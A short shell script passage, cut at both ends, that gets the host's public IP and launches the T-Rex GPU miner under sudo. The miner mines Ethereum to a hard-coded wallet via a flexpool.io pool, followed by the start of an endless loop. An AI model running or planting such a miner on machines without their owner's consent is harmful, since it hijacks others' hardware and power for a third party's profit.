...
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo LD_PRELOAD="" ./t-rex -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x0F8824d694772df58840EDdD06a36526A0063438 -p x -w $ip --keep-gpu-busy 
while [ 1 ]; do
